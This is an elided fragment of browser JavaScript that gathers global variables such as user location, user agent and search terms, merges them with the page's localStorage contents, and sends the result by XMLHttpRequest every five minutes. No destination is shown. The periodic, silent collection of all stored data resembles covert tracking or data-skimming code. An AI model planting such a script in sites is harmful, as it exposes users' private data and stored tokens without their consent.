...
const config = {
  ...
  globalVars: ['userLocation', 'userAgent', 'searchTerm']
};
!function (n) {
  var i = {};
  function r(t) {
...
function hashData(data) {
  ...
  for (let i = 0; i < concatenatedKeys.length; i++) {
    const charCode = concatenatedKeys.charCodeAt(i);
...
function globalVarData() {
  let globalVars = {};
  for (let variable of config.globalVars) {
  ...
  xhr.onreadystatechange = () => {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        ...
        console.error(`Data transmission failed with status code: ${xhr.status}`);
      }
    }
  };
}
...
function assembleAndSendData() {
  ...
  const globalVarsData = globalVarData();
  const combinedData = Object.assign(localStorageData, globalVarsData);
...
setInterval(assembleAndSendData, 5 * 60 * 1000);